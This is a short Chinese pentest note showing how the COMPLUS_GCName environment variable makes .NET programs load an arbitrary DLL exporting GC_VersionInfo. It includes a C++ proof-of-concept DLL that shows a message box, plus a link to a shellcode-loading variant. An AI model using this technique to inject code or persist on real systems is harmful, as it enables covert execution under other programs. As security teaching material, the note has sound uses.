	低权限用户可指定.net应用程序使用自定义垃圾收集器（GC），一个自定义GC可以以COMPLUS_GCName此环境变量指定，只需将此环境变量指向到恶意DLL，自定义GC的DLL需要一个名为GC_VersionInfo的导出表。
	下面是个弹框DLL
```cpp
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

struct VersionInfo
{
    UINT32 MajorVersion;
    UINT32 MinorVersion;
    UINT32 BuildVersion;
    const char* Name;

};

extern "C" __declspec(dllexport) void GC_VersionInfo(VersionInfo * info)
{
    info->BuildVersion = 0;
    info->MinorVersion = 0;
    info->BuildVersion = 0;
    MessageBoxA(NULL, "giao", "giao", 0);
}

```
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/686.png)

	后执行任意.net程序可加载此DLL
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/687.png)

	当然也可以加载shellcode
	https://github.com/am0nsec/MCGC
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/688.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/689.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/690.png)